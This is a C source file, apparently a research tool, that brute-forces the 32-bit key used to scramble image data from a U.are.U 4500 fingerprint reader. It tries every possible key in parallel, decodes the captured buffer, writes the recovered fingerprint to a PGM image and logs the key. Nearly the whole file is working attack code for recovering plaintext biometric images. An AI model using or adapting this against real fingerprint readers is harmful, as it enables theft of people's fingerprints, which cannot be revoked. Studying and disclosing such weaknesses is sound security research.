/* 
 * Fingerprint Key Cracking for U.are.U 4500 Fingerprint Reader
 * Copyright (C) 2019 Seong-Joong Kim <sungjungk@gmail.com>
 */

#include <stdio.h>
#include <glib.h>
#include <unistd.h>
#include <omp.h>
#include "fp-key-cracking.h"


bool
decode_image(raw_img_t *img, const uint8_t *buf, uint32_t key)
{
  int block_id = 0,  row = 0, pos = 0, row_pos = 0, flags = 0;

  memcpy(img, (raw_img_t*)buf, sizeof(*img));

  /* do decode */
  while (block_id < G_N_ELEMENTS(img->block_info) && pos < img->row_pos) {
    /* setup flags & row_pos */
    flags = img->block_info[block_id].flags;
    row_pos = img->block_info[block_id].row_pos;

    if (flags == BLOCKF_ENCRYPTED) {
      key = do_decode(&img->data[pos][0], row_pos * IMAGE_WIDTH, key);
      if (!key) 
        return false;
    } else {
      for (row = 0; row < row_pos * IMAGE_WIDTH; row++)
        key = update_key(key);
    }

    if (!(flags & BLOCKF_NOT_PRESENT))
      pos += row_pos;

    block_id++;
  }

  return true;
}

fp_img_t *
restore_image(raw_img_t *raw_img)
{
  int block_id = 0,  row = 0, pos = 0, row_pos = 0, flags = 0;
  fp_img_t *fp_img;

  /* make a clear fingerprint image */
  fp_img = fp_img_init();

  block_id = pos = row = 0;
  while (block_id < G_N_ELEMENTS(raw_img->block_info) &&
         row < raw_img->row_pos) {
    flags = raw_img->block_info[block_id].flags;
    row_pos = raw_img->block_info[block_id].row_pos;

    memcpy(&fp_img->data[pos], &raw_img->data[row][0], row_pos * IMAGE_WIDTH);
    if (!(flags & BLOCKF_NOT_PRESENT))
      row += row_pos;
    pos += row_pos * IMAGE_WIDTH;

    block_id++;
  }

  fp_img->width = IMAGE_WIDTH;
  fp_img->height = IMAGE_HEIGHT;

  return fp_img;
}

static bool
do_crack(const uint8_t *buf)
{
  double tbegin = 0, wtime = 0;
  uint32_t i = 0;
  bool found = false;

  raw_img_t raw_img;

  tbegin = omp_get_wtime();

  //omp_set_num_threads(4);
  //g_debug("OMP_STACKSIZE=%sn", getenv("OMP_STACKSIZE"));

#define KEY_SIZE 0xFFFFFFFF //UINT32_MAX
#pragma omp parallel default(shared) shared(found) private(raw_img)
  {
#pragma omp for schedule(dynamic)
    for (i = 0; i < UINT32_MAX; i++) {
      if (found)
        continue;

      if (!(i%100000000)) 
        g_debug("loop: %u (%d)", i, omp_get_thread_num());

      memset(&raw_img, 0, sizeof(raw_img_t));
      bool status = decode_image(&raw_img, buf, i);
      if (!status) 
        continue;

      fp_img_t *fp_img = restore_image(&raw_img);

      gchar *file_name = g_strdup_printf("%d_encoded_finger.pgm", 
                                          omp_get_thread_num());
      image_save(fp_img, file_name);
      g_free(file_name);

      /* */
      uint8_t key_bytes[4] = {0,0,0,0};
      key_bytes[0] = i >> 24;
      key_bytes[1] = i >> 16;
      key_bytes[2] = i >> 8;
      key_bytes[3] = i;

      g_debug("found the key: 0x%X 0x%X 0x%X 0x%X", 
               key_bytes[0], key_bytes[1], key_bytes[2], key_bytes[3]);

      found = true;

      wtime = omp_get_wtime() - tbegin;

      g_debug("collapsed time to find the key: %fs", wtime);

      g_free(fp_img);
    }
  }
  wtime = omp_get_wtime() - tbegin;

  g_debug("collapsed time: %fs", wtime);

  return found;
}

int 
main(int argc, char *argv[])
{
  uint8_t *buf = NULL;
  int file_len = 0;
  bool status = false;

  g_setenv ("G_MESSAGES_DEBUG", "all", TRUE);

  status = file_import(argv[1], (uint8_t**)&buf, &file_len);
  if (false == status) {
    g_warning("fail to file_import");
    return EXIT_FAILURE;
  }

  status = do_crack(buf);
  if (false == status) {
    g_warning("fail to do_crack");
    return EXIT_FAILURE;
  }

  g_free(buf);

  return 0;
}

/* end of fp_decoder.c */
